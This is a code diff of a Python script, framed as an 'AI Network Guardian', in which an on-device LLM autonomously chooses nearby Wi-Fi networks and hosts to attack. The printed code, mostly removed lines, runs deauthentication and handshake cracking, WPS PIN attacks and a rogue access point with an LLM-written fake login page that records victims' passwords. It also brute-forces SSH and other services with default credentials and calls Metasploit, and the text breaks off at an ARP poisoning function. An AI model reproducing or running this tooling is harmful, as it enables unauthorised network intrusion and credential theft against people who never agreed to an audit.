@@ -3,8 +3,8 @@
 # It leverages an on-device LLM via the StackFlow framework (using ZMQ)
 # to make autonomous decisions for network security auditing.
 
-# REQUIRED DEPENDENCY: This script requires the pyzmq library.
-# On the M5Stack device, install it using: pip install pyzmq
+# REQUIRED DEPENDENCIES: This script requires several packages.
+# Install them using: pip install -r requirements.txt
 
 import time
 import threading
@@ -23,7 +23,6 @@ import socket
 import nmap
 import asyncio
 import asyncssh
-from impacket.examples.ntlmrelayx import NTLMRelayxConfig, NTLMRelayx
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from metasploit.msfrpc import MsfRpcClient
 
@@ -56,6 +55,11 @@ guardian_state = {
     "ssh_accessible_hosts": {}
 }
 
+# --- Global State Management Functions ---
+
+# update_status Function
+# Updates the global guardian_state with the current status message, phase, and target.
+# It also appends the message to a log stream and prints it to the console.
 def update_status(status_msg, phase=None, target=None):
     timestamp = time.ctime()
     log_entry = f"[{timestamp}] {status_msg}"
@@ -68,6 +72,9 @@ def update_status(status_msg, phase=None, target=None):
     if target: guardian_state["current_target_ssid"] = target
     print(log_entry)
 
+# log_to_sd_card Function
+# Logs data to a specified file on the SD card. It handles file rotation
+# to prevent log files from growing too large.
 def log_to_sd_card(filename, data, max_size=1024*1024, backup_count=10):
     full_path = os.path.join(SD_CARD_LOG_PATH, filename)
     try:
@@ -83,6 +90,9 @@ def log_to_sd_card(filename, data, max_size=1024*1024, backup_count=10):
     except IOError as e:
         print(f"Error logging to SD card {full_path}: {e}")
 
+# save_state Function
+# Persists the current guardian_state to a JSON file on the SD card.
+# This allows the Guardian to resume operations after a restart.
 def save_state():
     state_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
     try:
@@ -94,6 +104,9 @@ def save_state():
     except Exception as e:
         update_status(f"Failed to save state: {e}", "Error")
 
+# load_state Function
+# Restores the guardian_state from a previously saved JSON file on the SD card.
+# This enables stateful operation across reboots.
 def load_state():
     state_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
     try:
@@ -106,6 +119,9 @@ def load_state():
     except Exception as e:
         update_status(f"Failed to load state: {e}", "Error")
 
+# send_via_uart Function
+# Sends a JSON command over UART (Universal Asynchronous Receiver-Transmitter)
+# and waits for a JSON response. This is used for communication with external modules.
 def send_via_uart(cmd):
     try:
         ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=2)
@@ -117,14 +133,27 @@ def send_via_uart(cmd):
         return None
 
 # --- Orchestrator ---
+# --- Orchestrator Class ---
 class AIAnalysisOrchestrator:
-    def __init__(self, llm_client):
+    """
+    The central brain of the AI Network Guardian. This class orchestrates
+    the entire security analysis process, making decisions based on LLM inference
+    and coordinating various security modules.
+    """
+    # --- Constructor ---
+    # Initializes the orchestrator with an LLM client and instances of
+    # WiFiSecurityModule, PasswordStrengthAnalyzer, LanAnalyzer, and VulnerabilitySimulator.
+    def __init__(self, llm_client, rpc_pass):
         self.llm = llm_client
         self.wifi = WiFiSecurityModule(WIFI_AUDIT_INTERFACE)
         self.analyzer = PasswordStrengthAnalyzer(AI_MODEL_PATH, llm_client)
         self.lan = LanAnalyzer(LAN_INTERFACE)
-        self.simulator = VulnerabilitySimulator(rpc_pass="your_rpc_pass")
+        self.simulator = VulnerabilitySimulator(rpc_pass=rpc_pass)
 
+    # --- get_wifi_audit_decision Function ---
+    # Queries the LLM to get a strategic decision on which Wi-Fi network to audit
+    # and which method to use (e.g., CONNECT_OPEN, AUDIT_WPA2).
+    # It prioritizes networks with weaker security.
     def get_wifi_audit_decision(self, networks):
         payload = {
             "networks": networks,
@@ -138,6 +167,10 @@ class AIAnalysisOrchestrator:
         )
         return self.llm.get_llm_inference(prompt)
 
+    # --- get_internal_analysis_decision Function ---
+    # Queries the LLM to get a strategic decision on the next internal network analysis action.
+    # It provides context about analyzed hosts, audited networks, and past audit history
+    # to help the AI make informed decisions.
     def get_internal_analysis_decision(self):
         audit_history = self.lan._load_audit_history()
         success_rates = self.lan._calculate_success_rates(audit_history)
@@ -195,6 +228,9 @@ RESPONSE FORMAT (JSON ONLY):
 }}"""
         return self.llm.get_llm_inference(prompt)
 
+    # --- summarize_vulns Function ---
+    # Sends raw Nmap and Nikto findings to the LLM to generate a summary
+    # of critical issues with remediation steps.
     def summarize_vulns(self, host_results):
         prompt = (
           "You are GuardianGPT. Here are raw Nmap and Nikto findings:\n"
@@ -203,6 +239,9 @@ RESPONSE FORMAT (JSON ONLY):
         )
         return self.llm.get_llm_inference(prompt)
 
+    # --- try_ssh_async Function (Asynchronous) ---
+    # Attempts to establish an SSH connection asynchronously to a given host
+    # with provided credentials. Returns True on success, False otherwise.
     async def try_ssh_async(self, host: str, user: str, pwd: str) -> bool:
         try:
             async with asyncssh.connect(host, username=user, password=pwd, 
@@ -211,6 +250,9 @@ RESPONSE FORMAT (JSON ONLY):
         except Exception:
             return False
 
+    # --- audit_host_ssh_async Function (Asynchronous) ---
+    # Asynchronously audits a single host for weak SSH credentials using a list of
+    # username/password combinations. Updates status and logs findings.
     async def audit_host_ssh_async(self, host: str, creds: list[tuple[str,str]]):
         for user, pwd in creds:
             if guardian_state["stop_signal"].is_set(): return host, None
@@ -220,6 +262,10 @@ RESPONSE FORMAT (JSON ONLY):
                 return host, (user, pwd)
         return host, None
 
+    # --- audit_ssh_credentials Function ---
+    # Orchestrates the SSH credential audit across a network CIDR.
+    # It can run synchronously or asynchronously using ThreadPoolExecutor or asyncio.
+    # It discovers hosts, proposes credentials using the analyzer, and attempts SSH connections.
     def audit_ssh_credentials(self, network_cidr: str, max_workers: int = 10, use_async: bool = False):
         update_status(f"Starting SSH credential audit on {network_cidr}...", "SSH Audit")
         hosts = discover_hosts(network_cidr)
@@ -240,6 +286,7 @@ RESPONSE FORMAT (JSON ONLY):
 
         if use_async:
             async def async_scan():
+                nonlocal failed_attempts
                 tasks = []
                 for host in hosts:
                     creds = self.analyzer.propose_ssh_creds(host) or STATIC_CREDS
@@ -254,8 +301,9 @@ RESPONSE FORMAT (JSON ONLY):
                         save_state()
                         self._log_audit_result("SSH", host, True, f"Weak credentials found: {success[0]}:{success[1]}")
                     else:
+                        # No need to log every failed attempt, only successes.
+                        # self._log_audit_result("SSH", host, False, "No weak credentials found.")
                         failed_attempts += 1
-                        self._log_audit_result("SSH", host, False, "No weak credentials found.")
                         if failed_attempts >= MAX_FAILED_ATTEMPTS_BEFORE_SKIP:
                             update_status(f"Reached max failed attempts threshold ({MAX_FAILED_ATTEMPTS_BEFORE_SKIP}), skipping remaining hosts", "Warning")
                             return results
@@ -276,664 +324,24 @@ RESPONSE FORMAT (JSON ONLY):
         update_status(f"SSH credential audit complete. Found {len(results)} hosts with weak passwords.", "SSH Audit")
         return results
 
-# --- Host Discovery Helper ---
-def discover_hosts(network_cidr: str) -> list[str]:
-    update_status(f"Discovering live hosts on {network_cidr} using Nmap...", "Discovery")
-    try:
-        nm = nmap.PortScanner()
-        nm.scan(hosts=network_cidr, arguments='-sn')
-        live_hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
-        update_status(f"Found {len(live_hosts)} live hosts.", "Discovery")
-        return live_hosts
-    except nmap.PortScannerError as e:
-        update_status(f"Nmap host discovery failed: {e}", "Error")
-        return []
-    except Exception as e:
-        update_status(f"Error during host discovery: {e}", "Error")
-        return []
-
-# --- SSH Attempt Logic ---
-STATIC_CREDS = [("root","root"), ("admin","admin"), ("pi","raspberry"), ("user","user")]
-
-def try_ssh(host: str, user: str, pwd: str, timeout: float=5.0) -> bool:
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh.connect(host, username=user, password=pwd, timeout=timeout, banner_timeout=timeout)
-        ssh.close()
-        return True
-    except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
-        return False
-    except Exception as e:
-        update_status(f"Unexpected error during SSH attempt on {host}: {e}", "Error")
-        return False
-
-# --- LLM Communication Module (ZMQ StackFlow Client) ---
-class StackFlowClient:
-    def __init__(self, endpoint):
-        self.endpoint = endpoint
-        self.context = zmq.Context.instance()
-        self.socket = None
-        self.llm_work_id = None
-        self.poller = zmq.Poller()
-        self.max_retries = 3
-        self.request_timeout = 30000
-        self._initialize_socket()
-
-    def _initialize_socket(self):
-        if self.socket:
-            self.poller.unregister(self.socket)
-            self.socket.close()
-        
-        self.socket = self.context.socket(zmq.REQ)
-        self.socket.setsockopt(zmq.LINGER, 0)
-        self.socket.setsockopt(zmq.RCVTIMEO, self.request_timeout)
-        self.poller.register(self.socket, zmq.POLLIN)
-        self.socket.connect(self.endpoint)
-
-    def _lazy_pirate_request(self, data):
-        retries = 0
-        while retries < self.max_retries:
-            try:
-                self.socket.send_json(data)
-                socks = dict(self.poller.poll(self.request_timeout))
-                if socks.get(self.socket) == zmq.POLLIN:
-                    return self.socket.recv_json()
-                else:
-                    raise zmq.Again("Timeout waiting for response")
-            except (zmq.Again, zmq.ZMQError) as e:
-                retries += 1
-                update_status(f"Request failed (attempt {retries}/{self.max_retries}): {e}", "Warning")
-                self._initialize_socket()
-                continue
-        update_status("Max ZMQ retries reached, attempting UART fallback.", "Warning")
-        return send_via_uart(data)
-
-    def _send_and_receive_json(self, data):
-        try:
-            return self._lazy_pirate_request(data)
-        except Exception as e:
-            update_status(f"ZMQ communication error: {e}", "Error")
-            return None
-
-    def connect(self):
-        ping_req = {"request_id": str(uuid.uuid4()), "action": "ping"}
-        response = self._lazy_pirate_request(ping_req)
-        if response and response.get("status") == "ok":
-            update_status(f"Successfully connected to StackFlow at {self.endpoint}", "AI Init")
-            return True
-        update_status(f"Failed to connect to StackFlow service.", "Error")
-        return False
-
-    def setup_llm(self, model="qwen2.5-0.5B-int8-ax630c", prompt="You are GuardianGPT, a cybersecurity AI. Analyze network data and provide security recommendations. Respond ONLY with a single, valid JSON object."):
-        init_data = {
-            "request_id": str(uuid.uuid4()),
-            "work_id": "llm",
-            "action": "setup",
-            "object": "llm.setup",
-            "data": { "model": model, "response_format": "llm.utf-8.stream", "input": "llm.utf-8.stream", "enoutput": True, "max_token_len": 2048, "prompt": prompt }
-        }
-        resp = self._send_and_receive_json(init_data)
-        if resp and not resp.get("error", {}).get("code", -1):
-            self.llm_work_id = resp.get("work_id")
-            if self.llm_work_id:
-                update_status(f"LLM session initialized with work_id: {self.llm_work_id}", "AI Init")
-                return True
-        update_status(f"LLM Setup Error: {resp.get('error', 'Unknown error')}", "Error")
-        return False
-
-    def get_llm_inference(self, user_prompt):
-        if not self.llm_work_id:
-            update_status("LLM session not initialized, cannot run inference.", "Error")
-            return None
-
-        req = { "request_id": str(uuid.uuid4()), "work_id": self.llm_work_id, "action": "inference", "object": "llm.utf-8.stream", "data": {"delta": user_prompt, "index": 0, "finish": True} }
-        
-        resp_meta = self._send_and_receive_json(req)
-        if not resp_meta:
-            update_status("LLM inference request failed (no ack).", "Error")
-            return None
-
-        full_response = ""
-        while True:
-            socks = dict(self.poller.poll(self.request_timeout))
-            if socks.get(self.socket) == zmq.POLLIN:
-                try:
-                    chunk = self.socket.recv_json()
-                    d = chunk.get("data", {})
-                    full_response += d.get("delta", "")
-                    if d.get("finish"): break
-                except json.JSONDecodeError:
-                    update_status("Received non-JSON response from LLM stream.", "Warning")
-                    continue
-            else:
-                update_status("Timeout waiting for LLM response chunk.", "Warning")
-                break
-        
-        if not full_response:
-            update_status("Received empty response from LLM.", "Warning")
-            return None
-
-        try:
-            return json.loads(full_response)
-        except json.JSONDecodeError:
-            update_status(f"Could not parse JSON from LLM response: {full_response}", "Error")
-            m = re.search(r'\{.*\}', full_response, re.DOTALL)
-            if m:
-                try: return json.loads(m.group(0))
-                except json.JSONDecodeError: update_status("Fallback JSON parsing also failed.", "Error")
-            return None
-
-    def close(self):
-        if self.llm_work_id:
-            self._send_and_receive_json({"request_id": "llm_exit", "work_id": self.llm_work_id, "action": "exit"})
-        self.socket.close()
-        self.context.term()
-
-# --- Core Security & Analysis Modules ---
-class WiFiSecurityModule:
-    def __init__(self, interface):
-        self.interface = interface
-        self._ensure_tools(["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "nmcli", "iw", "reaver", "hostapd", "dnsmasq"])
-
-    def _ensure_tools(self, tools):
-        for tool in tools:
-            try:
-                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
-            except Exception:
-                update_status(f"Warning: Tool '{tool}' not found. Attempting installation...", "Error")
-                try:
-                    packages = {"reaver": "reaver", "hostapd": "hostapd", "dnsmasq": "dnsmasq"}
-                    if tool in packages:
-                        subprocess.run(["sudo", "apt-get", "install", "-y", packages[tool]], check=True, timeout=120)
-                        update_status(f"Successfully installed {packages[tool]}.", "Init")
-                    else:
-                        update_status(f"No automatic installation configured for '{tool}'.", "Error")
-                except Exception as e:
-                    update_status(f"Failed to install missing tool '{tool}': {e}", "Error")
-
-    def set_monitor_mode(self, enable=True):
-        update_status(f"Setting monitor mode to {enable}...", "Wi-Fi Setup")
-        try:
-            mode_cmd = "monitor" if enable else "managed"
-            if enable: subprocess.run(["airmon-ng", "check", "kill"], check=False, capture_output=True)
-            subprocess.run(["ip", "link", "set", self.interface, "down"], check=True)
-            subprocess.run(["iw", self.interface, "set", "type", mode_cmd], check=True)
-            subprocess.run(["ip", "link", "set", self.interface, "up"], check=True)
-            if not enable: subprocess.run(["service", "NetworkManager", "start"], check=False, capture_output=True)
-            guardian_state["wireless_mode"] = mode_cmd
-            return True
-        except Exception as e:
-            update_status(f"Failed to set monitor mode: {e}", "Error")
-            return False
-
-    def scan_wifi_networks(self):
-        if guardian_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return []
-        update_status("Scanning for Wi-Fi networks...", "Wi-Fi Scanning")
-        networks = {}
-        prefix = "/tmp/airodump_scan"
-        for f in glob.glob(f"{prefix}*"): os.remove(f)
-        try:
-            cmd = ["airodump-ng", self.interface, "-w", prefix, "--output-format", "kismet,netxml,csv", "--wps"]
-            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            time.sleep(15); proc.terminate(); proc.wait(timeout=5)
-            xml_files = glob.glob(f"{prefix}*.netxml")
-            if not xml_files: return []
-            root = ET.parse(xml_files[0]).getroot()
-            for net in root.findall('wireless-network'):
-                ssid_el = net.find('SSID/essid')
-                if ssid_el is None or ssid_el.text is None: continue
-                bssid = net.find('BSSID').text
-                wps_el = net.find('SSID/wps-info/wps')
-                networks[bssid] = {
-                    "ssid": ssid_el.text, "bssid": bssid, "channel": int(net.find('channel').text),
-                    "encryption": " / ".join(sorted(list(set(e.text for e in net.findall('encryption'))))) or "OPEN",
-                    "signal_strength": int(net.find('snr-info/last_signal_dbm').text), "clients": 0,
-                    "wps_enabled": wps_el is not None and wps_el.text == 'Yes'
-                }
-            csv_files = glob.glob(f"{prefix}*.csv")
-            if csv_files:
-                with open(csv_files[0], 'r') as f:
-                    reader = csv.reader(f, skipinitialspace=True)
-                    in_clients = False
-                    for row in reader:
-                        if row and row[0].strip() == 'Station MAC': in_clients = True; continue
-                        if in_clients and len(row) > 5 and row[5].strip() in networks: networks[row[5].strip()]["clients"] += 1
-            return list(networks.values())
-        except Exception as e:
-            update_status(f"Wi-Fi scan error: {e}", "Error"); return []
-
-    def capture_handshake_for_audit(self, ssid, bssid, channel):
-        if guardian_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return None
-        update_status(f"Capturing handshake for {ssid} to audit password strength...", "Wi-Fi Audit", ssid)
-        path = os.path.join(SD_CARD_LOG_PATH, f"{ssid}_handshake")
-        try:
-            dump_cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "-w", path, self.interface]
-            dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            time.sleep(5)
-            subprocess.run(["aireplay-ng", "-0", "5", "-a", bssid, self.interface], check=True, capture_output=True, timeout=30)
-            time.sleep(10)
-            dump_proc.terminate(); dump_proc.wait(timeout=5)
-            cap_file = f"{path}-01.cap"
-            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0: return cap_file
-            return None
-        except Exception as e:
-            update_status(f"Handshake capture failed: {e}", "Error"); return None
-
-    def audit_wps(self, bssid):
-        update_status(f"Starting WPS vulnerability audit on {bssid}...", "Wi-Fi Audit", bssid)
-        try:
-            cmd = ["reaver", "-i", self.interface, "-b", bssid, "-vv", "-K", "1"]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=WPS_AUDIT_TIMEOUT)
-            pin_match = re.search(r"WPS PIN: '(\d+)'", proc.stdout)
-            pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
-            if pass_match:
-                update_status(f"WPS is vulnerable on {bssid}. Password recovered. Recommend disabling WPS.", "Vulnerability Found")
-                return pass_match.group(1)
-            if pin_match:
-                update_status(f"WPS PIN found: {pin_match.group(1)}. Re-running to get PSK.", "Wi-Fi Audit")
-                proc = subprocess.run(cmd + ["-p", pin_match.group(1)], capture_output=True, text=True, timeout=300)
-                pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
-                if pass_match: return pass_match.group(1)
-            update_status(f"WPS audit on {bssid} complete. No vulnerabilities found.", "Wi-Fi Audit")
-            return None
-        except Exception as e:
-            update_status(f"WPS audit failed: {e}", "Error")
-            return None
-
-    def simulate_rogue_ap(self, ssid, channel, llm_client):
-        update_status(f"Simulating Rogue AP for {ssid} to test network resilience...", "Simulation", ssid)
-        hostapd_conf_path = "/tmp/hostapd_rogue.conf"
-        dnsmasq_conf_path = "/tmp/dnsmasq_rogue.conf"
-        
-        hostapd_conf = f"interface={self.interface}\ndriver=nl80211\nssid={ssid}\nchannel={channel}\nhw_mode=g\n"
-        dnsmasq_conf = f"interface={self.interface}\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/10.0.0.1\n"
-        
-        try:
-            with open(hostapd_conf_path, "w") as f: f.write(hostapd_conf)
-            with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_conf)
-            
-            subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=True)
-            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface], check=True)
-            
-            subprocess.Popen(["hostapd", hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf_path, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            self.simulate_captive_portal(llm_client, ssid)
-            update_status("Rogue AP simulation and captive portal are active.", "Simulation")
-            return True
-        except Exception as e:
-            update_status(f"Rogue AP simulation failed: {e}", "Error")
-            return False
-
-    def simulate_captive_portal(self, llm_client, target_ssid):
-        prompt = f"Generate complete HTML/CSS for a captive portal login page for a Wi-Fi network named '{target_ssid}'. The form should POST to '/login'. This is for a security simulation. Respond ONLY with HTML."
-        portal_html = llm_client.get_llm_inference(prompt)
-        if not portal_html or not isinstance(portal_html, str):
-            portal_html = f"<html><body><h1>Login to {target_ssid}</h1><form method='post' action='/login'><input name='username' placeholder='Username'><input name='password' type='password' placeholder='Password'><button type='submit'>Log In</button></form></body></html>"
-        
-        from flask import Flask, request as flask_request, render_template_string as flask_render_template_string
-        portal_app = Flask("captive_portal")
-        
-        @portal_app.route('/')
-        def serve_portal(): return flask_render_template_string(portal_html)
-        
-        @portal_app.route('/login', methods=['POST'])
-        def capture_creds():
-            creds = flask_request.form.to_dict()
-            update_status(f"Captive portal simulation captured credentials: {json.dumps(creds)}", "Simulation Result")
-            log_to_sd_card("rogue_ap_credentials.log", json.dumps(creds))
-            return "<h3>Connection Successful! This was a security test.</h3>"
-            
-        def run_portal():
-            try: portal_app.run(host='0.0.0.0', port=80, debug=False)
-            except Exception as e: update_status(f"Captive portal simulation failed: {e}", "Error")
-            
-        threading.Thread(target=run_portal, daemon=True).start()
-
-    def connect_to_network(self, ssid, password=None):
-        if guardian_state["wireless_mode"] == "monitor": self.set_monitor_mode(enable=False); time.sleep(5)
-        update_status(f"Connecting to {ssid}...", "Connecting", ssid)
-        try:
-            cmd = ["nmcli", "device", "wifi", "connect", ssid]
-            if password: cmd.extend(["password", password])
-            subprocess.run(cmd, check=True, capture_output=True, timeout=30)
-            update_status(f"Successfully connected to {ssid}", "Connected", ssid)
-            return True
-        except Exception as e:
-            update_status(f"Failed to connect to {ssid}: {e}", "Error")
-            return False
-
-class PasswordStrengthAnalyzer:
-    def __init__(self, model_path, llm_client):
-        self.model_path = model_path
-        self.llm_client = llm_client
-        self.sd_password_file = "/mnt/sdcard/assets/ai_generated_passwords.txt"
-        self.common_passwords = self._load_common_passwords()
-
-    def get_mac_vendor(self, host_ip: str) -> str:
-        try:
-            nm = nmap.PortScanner()
-            nm.scan(hosts=host_ip, arguments='-sn')
-            mac = nm[host_ip]['addresses'].get('mac', 'unknown')
-            if mac != 'unknown':
-                vendor = nm[host_ip]['vendor'].get(mac, 'unknown')
-                return f"{mac} ({vendor})" if vendor != 'unknown' else mac
-            return "unknown"
-        except Exception:
-            return "unknown"
-
-    def propose_ssh_creds(self, host_ip: str) -> list[tuple[str,str]]:
-        update_status(f"Asking AI for likely weak SSH creds for {host_ip}...", "AI Inference")
-        mac_vendor = self.get_mac_vendor(host_ip)
-        prompt = (
-            f"You are GuardianGPT. Suggest the 5 most likely weak or default SSH login "
-            f"username/password combinations for a Linux host at {host_ip} "
-            f"with manufacturer info: {mac_vendor}. Consider common defaults. "
-            "Respond ONLY with JSON: [{\"user\":\"root\",\"pass\":\"toor\"}, {\"user\":\"admin\",\"pass\":\"password\"}]"
-        )
-        result = self.llm_client.get_llm_inference(prompt)
-        if isinstance(result, list):
-            try:
-                pairs = [(item["user"], item["pass"]) for item in result if "user" in item and "pass" in item]
-                update_status(f"AI proposed {len(pairs)} weak SSH creds for {host_ip}.", "AI Inference")
-                return pairs
-            except Exception as e:
-                update_status(f"Error parsing AI SSH creds: {e}. Raw: {result}", "Error")
-        update_status(f"AI did not provide valid SSH creds for {host_ip}. Falling back to static list.", "Warning")
-        return []
-
-    def _load_common_passwords(self):
-        os.makedirs(os.path.dirname(self.sd_password_file), exist_ok=True)
-        passwords = set()
-        try:
-            local_path = os.path.join(self.model_path, "common_passwords.txt")
-            with open(local_path, 'r') as f:
-                for line in f:
-                    if line.strip(): passwords.add(line.strip())
-            update_status("Loaded base passwords from local assets.", "Init")
-        except Exception as e:
-            update_status(f"Could not load base passwords: {e}", "Warning")
-        try:
-            update_status(f"Loading dynamically generated passwords from {self.sd_password_file}", "Init")
-            with open(self.sd_password_file, 'a+') as f:
-                f.seek(0)
-                for line in f:
-                    if line.strip(): passwords.add(line.strip())
-        except Exception as e:
-            update_status(f"Failed to load or create password file on SD card: {e}", "Error")
-        return list(passwords)
-
-    def generate_ai_guesses(self, context, num_guesses=50):
-        update_status(f"Generating {num_guesses} AI password guesses for '{context}'...", "Password Analysis")
-        prompt = f"Generate a JSON list of {num_guesses} likely password candidates for a Wi-Fi network with the SSID '{context}'. Respond ONLY with a JSON array of strings."
-        response_json = self.llm_client.get_llm_inference(prompt)
-        ai_guesses = response_json if isinstance(response_json, list) else [f"{context}123", f"admin{context}"]
-        try:
-            existing_passwords = set(self.common_passwords)
-            new_guesses = [p for p in ai_guesses if p not in existing_passwords]
-            if new_guesses:
-                with open(self.sd_password_file, 'a') as f:
-                    for guess in new_guesses:
-                        f.write(guess + '\n')
-                update_status(f"Appended {len(new_guesses)} new passwords to SD card file.", "Password Analysis")
-                self.common_passwords.extend(new_guesses)
-        except Exception as e:
-            update_status(f"Failed to write AI guesses to SD card: {e}", "Error")
-        return ai_guesses
-
-    def verify_wpa2_password(self, handshake_file, ssid, password):
-        tmp_wordlist = "/tmp/temp_candidate.txt"
-        try:
-            with open(tmp_wordlist, "w") as f: f.write(password + "\n")
-            cmd = ["aircrack-ng", "-w", tmp_wordlist, "-e", ssid, handshake_file]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            return "KEY FOUND!" in proc.stdout
-        except Exception: return False
-        finally:
-            if os.path.exists(tmp_wordlist): os.remove(tmp_wordlist)
-
-    def analyze_handshake(self, handshake_file, ssid):
-        update_status(f"Starting password strength analysis for {ssid}...", "Password Analysis", ssid)
-        for password in self.common_passwords:
-            if guardian_state["stop_signal"].is_set(): return None
-            if self.verify_wpa2_password(handshake_file, ssid, password):
-                return password
-        ai_guesses = self.generate_ai_guesses(context=ssid)
-        for password in ai_guesses:
-            if guardian_state["stop_signal"].is_set(): return None
-            if self.verify_wpa2_password(handshake_file, ssid, password):
-                return password
-        return None
-
-class LanAnalyzer:
-    def __init__(self, interface):
-        self.interface = interface
-        self._ensure_tools(["nmap", "ip", "arpspoof", "nikto", "hydra", "smbclient"])
-
-    def _ensure_tools(self, tools):
-        for tool in tools:
-            try:
-                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
-            except Exception:
-                update_status(f"Warning: Tool '{tool}' not found. Attempting installation...", "Error")
-                try:
-                    packages = {"arpspoof": "dsniff", "nikto": "nikto", "hydra": "hydra", "smbclient": "smbclient"}
-                    if tool in packages:
-                        subprocess.run(["sudo", "apt-get", "install", "-y", packages[tool]], check=True, timeout=120)
-                        update_status(f"Successfully installed {packages[tool]}.", "Init")
-                    else:
-                        update_status(f"No automatic installation configured for '{tool}'.", "Error")
-                except Exception as e:
-                    update_status(f"Failed to install missing tool '{tool}': {e}", "Error")
-
-    def get_local_ip_and_subnet(self):
-        try:
-            result = subprocess.run(["ip", "addr", "show", self.interface], capture_output=True, text=True, check=True)
-            ip_match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", result.stdout)
-            if ip_match:
-                ip_with_cidr = ip_match.group(1)
-                ip_address, _ = ip_with_cidr.split('/')
-                return ip_address, ip_with_cidr
-            return None, None
-        except Exception: return None, None
-
-    def run_nmap_scan(self, target_ip_range):
-        update_status(f"Running deep Nmap scan on {target_ip_range}...", "Discovery")
-        found_hosts = {}
-        try:
-            command = ["nmap", "-sV", "-sC", "-O", "-T4", "-oX", "-", target_ip_range]
-            process = subprocess.run(command, capture_output=True, text=True, check=True, timeout=NMAP_SCAN_TIMEOUT)
-            root = ET.fromstring(process.stdout)
-            for host in root.findall('host'):
-                ip = host.find("address[@addrtype='ipv4']").get('addr')
-                os_match = host.find("os/osmatch")
-                os_name = os_match.get('name') if os_match is not None else "Unknown"
-                ports = {}
-                for p in host.findall("ports/port"):
-                    service = p.find('service')
-                    if service is not None:
-                        ports[p.get('portid')] = {
-                            "service": service.get('name', 'unknown'),
-                            "product": service.get('product', 'unknown'),
-                            "version": service.get('version', 'unknown')
-                        }
-                found_hosts[ip] = {"os": os_name, "ports": ports, "vulnerabilities": {}, "credentials": {}, "shares": []}
-            guardian_state["analyzed_hosts"].update(found_hosts)
-            return found_hosts
-        except Exception as e:
-            update_status(f"Nmap scan failed: {e}", "Error")
-            return {}
-
-    def run_nikto_scan(self, target_ip, port):
-        update_status(f"Running Nikto vulnerability scan on {target_ip}:{port}...", "Vulnerability Scan")
-        try:
-            command = ["nikto", "-h", f"http://{target_ip}:{port}", "-Tuning", "x", "6", "-output", "-"]
-            process = subprocess.run(command, capture_output=True, text=True, timeout=NIKTO_SCAN_TIMEOUT)
-            if target_ip in guardian_state["analyzed_hosts"]:
-                guardian_state["analyzed_hosts"][target_ip]["vulnerabilities"][port] = process.stdout
-            log_to_sd_card(f"nikto_{target_ip}_{port}.log", process.stdout)
-            update_status(f"Nikto scan on {target_ip}:{port} complete.", "Vulnerability Scan")
-            return process.stdout
-        except Exception as e:
-            update_status(f"Nikto scan failed: {e}", "Error")
-            return None
-
-    def test_service_credentials(self, target_ip, port, service, password_list):
-        update_status(f"Starting credential strength test on {target_ip}:{port} ({service})...", "Credential Audit")
-        user_list = os.path.join(AI_MODEL_PATH, "common_users.txt")
-        pass_file = "/tmp/hydra_pass.txt"
-        with open(pass_file, "w") as f:
-            for p in password_list: f.write(p + "\n")
-        
-        try:
-            cmd = ["hydra", "-L", user_list, "-P", pass_file, "-s", port, f"{service}://{target_ip}"]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=HYDRA_TIMEOUT)
-            creds_match = re.search(r"login: (\S+)\s+password: (\S+)", proc.stdout)
-            if creds_match:
-                username = creds_match.group(1)
-                password = creds_match.group(2)
-                update_status(f"VULNERABILITY: Weak credentials found for {service} on {target_ip} - {username}:{password}", "Vulnerability Found")
-                if target_ip in guardian_state["analyzed_hosts"]:
-                    guardian_state["analyzed_hosts"][target_ip]["credentials"][service] = f"{username}:{password}"
-                return f"{username}:{password}"
-            else:
-                update_status(f"Credential test on {target_ip}:{port} completed. No weak credentials found.", "Credential Audit")
-                return None
-        except Exception as e:
-            update_status(f"Credential test failed: {e}", "Error")
-            return None
-        finally:
-            if os.path.exists(pass_file): os.remove(pass_file)
-
-    def enumerate_smb_shares(self, target_ip):
-        update_status(f"Enumerating SMB shares on {target_ip}...", "Discovery")
-        try:
-            cmd = ["smbclient", "-L", f"//{target_ip}", "-N"]
-            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-            shares = re.findall(r"^\s+(Disk\s+.+?)\s+", proc.stdout, re.MULTILINE)
-            if shares and target_ip in guardian_state["analyzed_hosts"]:
-                guardian_state["analyzed_hosts"][target_ip]["shares"] = shares
-                update_status(f"Found open SMB shares on {target_ip}: {shares}. Recommend restricting access.", "Vulnerability Found")
-            return shares
-        except Exception as e:
-            update_status(f"SMB enumeration failed: {e}", "Error")
-            return []
-
-    def simulate_arp_poisoning(self, target_ip, gateway_ip):
